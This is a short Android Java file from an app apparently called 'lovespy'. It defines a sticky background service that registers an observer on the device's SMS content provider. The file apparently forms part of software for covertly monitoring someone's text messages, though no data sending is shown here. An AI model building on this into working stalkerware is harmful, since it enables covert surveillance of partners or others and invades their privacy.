package com.example.lovespy.app.service;

import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import com.example.lovespy.app.sms.SmsSentObserver;

public class SmsService extends Service {

    private static final Uri STATUS_URI = Uri.parse("content://sms");
    private SmsSentObserver mSmsSentObserver;

    @Override
    public void onCreate() {
        super.onCreate();
        mSmsSentObserver = new SmsSentObserver(new Handler(), this);
        getContentResolver().registerContentObserver(STATUS_URI, true, mSmsSentObserver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        getContentResolver().unregisterContentObserver(mSmsSentObserver);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
}
